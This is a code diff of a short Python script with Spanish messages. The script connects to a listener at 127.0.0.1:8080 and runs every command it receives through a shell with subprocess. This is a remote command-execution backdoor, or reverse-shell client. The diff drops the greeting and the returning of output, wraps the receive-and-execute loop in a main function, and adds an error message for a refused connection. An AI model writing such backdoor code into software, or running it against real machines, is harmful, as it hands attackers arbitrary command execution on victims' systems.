@@ -3,16 +3,21 @@ import subprocess
 
 target = '127.0.0.1'
 port = int(8080)
-data = "Conexion establecida"
 def exec(command):
     return subprocess.check_output(command, shell=True)
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection.connect((target, port))
-connection.send(data.encode())
 
-while True:
-    command = connection.recv(1024)
-    result_command = exec(command)
-    connection.send(result_command.encode())
-connection.close()
+def main():
+    while True:
+        command = connection.recv(1024)
+        exec(command)
+    connection.close()
+
+
+if __name__ == '__main__':
+    try:
+        main()
+    except ConnectionRefusedError:
+        print('[ERROR] El servidor no permitio esta conexión')
